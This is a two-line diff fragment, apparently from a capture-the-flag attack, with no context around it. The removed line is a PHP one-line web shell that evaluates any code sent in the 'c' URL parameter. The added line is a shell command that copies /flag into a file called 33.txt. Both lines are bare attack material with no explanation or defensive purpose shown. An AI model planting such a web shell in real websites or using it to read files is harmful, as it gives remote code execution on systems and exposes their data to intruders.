@@ -1,1 +1,1 @@
- <?php @eval($_GET['c']);?>
+cat /flag > 33.txt
